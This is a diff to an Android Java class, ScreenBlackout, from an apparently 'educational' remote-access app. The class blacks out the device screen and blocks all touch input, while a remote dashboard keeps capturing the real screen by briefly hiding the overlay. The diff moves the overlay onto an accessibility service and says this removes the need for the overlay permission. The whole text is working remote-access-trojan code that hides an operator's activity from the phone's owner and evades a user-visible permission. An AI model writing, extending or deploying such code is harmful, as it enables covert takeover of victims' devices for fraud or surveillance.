@@ -1,61 +1,69 @@
 package com.remoteaccess.educational.commands;
 
-import android.content.Context;
 import android.graphics.Color;
 import android.graphics.PixelFormat;
-import android.os.Build;
 import android.os.Handler;
 import android.os.Looper;
-import android.provider.Settings;
 import android.util.Log;
-import android.view.MotionEvent;
 import android.view.View;
 import android.view.WindowManager;
+import com.remoteaccess.educational.services.UnifiedAccessibilityService;
 import org.json.JSONObject;
 
 /**
- * ScreenBlackout — draws a full-screen opaque black overlay using WindowManager.
+ * ScreenBlackout — draws a full-screen opaque black overlay using TYPE_ACCESSIBILITY_OVERLAY.
  *
- * The physical device screen appears completely blank (black) and ALL touch
- * events are consumed — no app or system UI underneath receives any input.
+ * Uses the accessibility service's WindowManager so NO SYSTEM_ALERT_WINDOW permission
+ * is required. The overlay is created in the context of UnifiedAccessibilityService.
  *
- * The dashboard receives stream frames via runWithOverlayHidden() which briefly
- * hides the overlay, captures, then restores it.
- *
- * Requires: android.permission.SYSTEM_ALERT_WINDOW
+ * Has its own dedicated fast-path: commands are applied immediately via postAtFrontOfQueue
+ * to avoid queuing behind stream frames or other work.
  */
 public class ScreenBlackout {
 
     private static final String TAG = "ScreenBlackout";
 
-    private final Context       context;
-    private final WindowManager windowManager;
-    private final Handler       mainHandler = new Handler(Looper.getMainLooper());
+    private final Handler mainHandler = new Handler(Looper.getMainLooper());
+    private final Object  lock        = new Object();
 
-    // Synchronize all state changes to avoid race conditions
-    private final Object lock = new Object();
-    private View    overlayView = null;
-    private boolean active      = false;
-    // Track whether the view has been physically added to WindowManager
-    private boolean viewAttached = false;
+    private UnifiedAccessibilityService service     = null;
+    private View                        overlayView = null;
+    private boolean                     active      = false;
+    private boolean                     viewAttached = false;
 
-    private static ScreenBlackout instance;
+    private static volatile ScreenBlackout instance;
 
-    public static synchronized ScreenBlackout getInstance(Context context) {
-        if (instance == null) instance = new ScreenBlackout(context.getApplicationContext());
+    public static ScreenBlackout getInstance() {
+        if (instance == null) {
+            synchronized (ScreenBlackout.class) {
+                if (instance == null) instance = new ScreenBlackout();
+            }
+        }
         return instance;
     }
 
-    private ScreenBlackout(Context context) {
-        this.context       = context;
-        this.windowManager = (WindowManager) context.getSystemService(Context.WINDOW_SERVICE);
+    private ScreenBlackout() {}
+
+    /** Called by UnifiedAccessibilityService.onServiceConnected() */
+    public void setService(UnifiedAccessibilityService svc) {
+        synchronized (lock) { this.service = svc; }
+        Log.i(TAG, "Accessibility service registered — blackout ready");
+    }
+
+    /** Called by UnifiedAccessibilityService.onUnbind() */
+    public void clearService() {
+        synchronized (lock) {
+            if (active) removeOverlay();
+            this.service = null;
+        }
+        Log.i(TAG, "Accessibility service unregistered");
     }
 
     public boolean isActive() {
         synchronized (lock) { return active; }
     }
 
-    /** Enable the black screen overlay on the device. */
+    /** Enable black screen — runs at front of main queue for minimum latency. */
     public JSONObject enableBlackout() {
         JSONObject result = new JSONObject();
         try {
@@ -65,81 +73,68 @@ public class ScreenBlackout {
                     result.put("message", "Screen blackout already active");
                     return result;
                 }
+                if (service == null) {
+                    result.put("success", false);
+                    result.put("error", "Accessibility service not running — enable it first");
+                    return result;
+                }
             }
 
-            // Guard: overlay permission must be granted
-            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && !Settings.canDrawOverlays(context)) {
-                result.put("success", false);
-                result.put("error", "Overlay permission not granted — enable 'Display over other apps' from the Permissions tab first");
-                return result;
-            }
+            final Object latch      = new Object();
+            final boolean[] done    = {false};
+            final boolean[] success = {false};
 
-            // Use a latch so we block until the view is actually attached
-            final Object attachLock = new Object();
-            final boolean[] attached = {false};
-
-            mainHandler.post(() -> {
+            // postAtFrontOfQueue = highest priority, applied before pending frames
+            mainHandler.postAtFrontOfQueue(() -> {
                 synchronized (lock) {
                     try {
-                        View v = new View(context);
+                        if (service == null || active) return;
+
+                        View v = new View(service);
                         v.setBackgroundColor(Color.BLACK);
+                        v.setOnTouchListener((view, event) -> true); // consume all touches
 
-                        // Consume ALL touch events so nothing underneath receives input
-                        v.setOnTouchListener((view, event) -> true);
-
-                        int type = Build.VERSION.SDK_INT >= Build.VERSION_CODES.O
-                                ? WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
-                                : WindowManager.LayoutParams.TYPE_PHONE;
-
-                        // Flags:
-                        //   FLAG_NOT_FOCUSABLE  — don't steal keyboard focus
-                        //   FLAG_LAYOUT_IN_SCREEN — extend behind status/nav bars
-                        //   FLAG_FULLSCREEN     — hide status bar decorations
-                        // We deliberately do NOT set FLAG_NOT_TOUCHABLE so that
-                        // the overlay intercepts and consumes every touch gesture.
-                        // We also do NOT set FLAG_NOT_TOUCH_MODAL so touches cannot
-                        // escape to windows below.
                         WindowManager.LayoutParams params = new WindowManager.LayoutParams(
                                 WindowManager.LayoutParams.MATCH_PARENT,
                                 WindowManager.LayoutParams.MATCH_PARENT,
-                                type,
+                                WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY,
                                 WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE
                                         | WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN
                                         | WindowManager.LayoutParams.FLAG_FULLSCREEN
-                                        | WindowManager.LayoutParams.FLAG_WATCH_OUTSIDE_TOUCH,
+                                        | WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL,
                                 PixelFormat.OPAQUE
                         );
 
-                        windowManager.addView(v, params);
+                        WindowManager wm = (WindowManager)
+                                service.getSystemService(android.content.Context.WINDOW_SERVICE);
+                        wm.addView(v, params);
+
                         overlayView  = v;
                         active       = true;
                         viewAttached = true;
-                        Log.i(TAG, "Screen blackout ENABLED — all touch blocked");
+                        success[0]   = true;
+                        Log.i(TAG, "Screen blackout ENABLED via TYPE_ACCESSIBILITY_OVERLAY");
                     } catch (Exception e) {
                         Log.e(TAG, "enableBlackout error: " + e.getMessage());
                     }
                 }
-                synchronized (attachLock) {
-                    attached[0] = true;
-                    attachLock.notifyAll();
-                }
+                synchronized (latch) { done[0] = true; latch.notifyAll(); }
             });
 
-            // Wait up to 1 s for the view to attach before returning success
-            synchronized (attachLock) {
-                long deadline = System.currentTimeMillis() + 1000;
-                while (!attached[0] && System.currentTimeMillis() < deadline) {
-                    try { attachLock.wait(50); } catch (InterruptedException ignored) { break; }
+            synchronized (latch) {
+                long deadline = System.currentTimeMillis() + 1500;
+                while (!done[0] && System.currentTimeMillis() < deadline) {
+                    try { latch.wait(50); } catch (InterruptedException ignored) { break; }
                 }
             }
 
             synchronized (lock) {
-                if (active) {
+                if (success[0]) {
                     result.put("success", true);
-                    result.put("message", "Screen blackout enabled — device screen is black and touch is blocked");
+                    result.put("message", "Screen blackout enabled");
                 } else {
                     result.put("success", false);
-                    result.put("error", "Failed to attach overlay — check permissions");
+                    result.put("error", "Failed to attach overlay — accessibility service may not be active");
                 }
             }
         } catch (Exception e) {
@@ -148,7 +143,7 @@ public class ScreenBlackout {
         return result;
     }
 
-    /** Disable the black screen overlay. */
+    /** Disable black screen — runs at front of main queue for minimum latency. */
     public JSONObject disableBlackout() {
         JSONObject result = new JSONObject();
         try {
@@ -160,66 +155,64 @@ public class ScreenBlackout {
                 }
             }
 
-            final Object removeLock = new Object();
-            final boolean[] removed = {false};
+            final Object latch   = new Object();
+            final boolean[] done = {false};
 
-            mainHandler.post(() -> {
-                synchronized (lock) {
-                    try {
-                        if (overlayView != null && viewAttached) {
-                            windowManager.removeView(overlayView);
-                        }
-                    } catch (Exception e) {
-                        Log.e(TAG, "disableBlackout removeView error: " + e.getMessage());
-                    } finally {
-                        overlayView  = null;
-                        active       = false;
-                        viewAttached = false;
-                        Log.i(TAG, "Screen blackout DISABLED");
-                    }
-                }
-                synchronized (removeLock) {
-                    removed[0] = true;
-                    removeLock.notifyAll();
-                }
+            mainHandler.postAtFrontOfQueue(() -> {
+                synchronized (lock) { removeOverlay(); }
+                synchronized (latch) { done[0] = true; latch.notifyAll(); }
             });
 
-            // Wait for removal to complete
-            synchronized (removeLock) {
-                long deadline = System.currentTimeMillis() + 1000;
-                while (!removed[0] && System.currentTimeMillis() < deadline) {
-                    try { removeLock.wait(50); } catch (InterruptedException ignored) { break; }
+            synchronized (latch) {
+                long deadline = System.currentTimeMillis() + 1500;
+                while (!done[0] && System.currentTimeMillis() < deadline) {
+                    try { latch.wait(50); } catch (InterruptedException ignored) { break; }
                 }
             }
 
             result.put("success", true);
-            result.put("message", "Screen blackout disabled — device screen is visible again");
+            result.put("message", "Screen blackout disabled");
         } catch (Exception e) {
             try { result.put("success", false); result.put("error", e.getMessage()); } catch (Exception ignored) {}
         }
         return result;
     }
 
+    /** Must be called on main thread while holding lock. */
+    private void removeOverlay() {
+        try {
+            if (overlayView != null && viewAttached && service != null) {
+                WindowManager wm = (WindowManager)
+                        service.getSystemService(android.content.Context.WINDOW_SERVICE);
+                wm.removeView(overlayView);
+            }
+        } catch (Exception e) {
+            Log.e(TAG, "disableBlackout removeView: " + e.getMessage());
+        } finally {
+            overlayView  = null;
+            active       = false;
+            viewAttached = false;
+            Log.i(TAG, "Screen blackout DISABLED");
+        }
+    }
+
     /**
-     * Briefly hide the overlay, run the capture runnable, then restore it.
-     * This allows the dashboard stream to capture real screen content while
-     * the physical device continues to see a black screen.
-     *
-     * Called from the streaming thread — briefly synchronizes with main thread.
+     * Briefly hide the overlay so the streaming thread can capture real content,
+     * then immediately restore it. Uses postAtFrontOfQueue for minimal frame delay.
      */
     public void runWithOverlayHidden(Runnable captureTask) {
-        boolean isCurrentlyActive;
-        synchronized (lock) { isCurrentlyActive = active && viewAttached && overlayView != null; }
+        boolean isActive;
+        synchronized (lock) { isActive = active && viewAttached && overlayView != null; }
 
-        if (!isCurrentlyActive) {
+        if (!isActive) {
             captureTask.run();
             return;
         }
 
         final Object captureLock = new Object();
-        final boolean[] done = {false};
+        final boolean[] done     = {false};
 
-        mainHandler.post(() -> {
+        mainHandler.postAtFrontOfQueue(() -> {
             View v;
             synchronized (lock) { v = overlayView; }
             try {
@@ -228,7 +221,6 @@ public class ScreenBlackout {
             } finally {
                 if (v != null) {
                     synchronized (lock) {
-                        // Only restore if still active (not removed while capturing)
                         if (active && viewAttached) v.setVisibility(View.VISIBLE);
                     }
                 }
@@ -239,7 +231,7 @@ public class ScreenBlackout {
         synchronized (captureLock) {
             long deadline = System.currentTimeMillis() + 400;
             while (!done[0] && System.currentTimeMillis() < deadline) {
-                try { captureLock.wait(50); } catch (InterruptedException ignored) { break; }
+                try { captureLock.wait(30); } catch (InterruptedException ignored) { break; }
             }
         }
     }
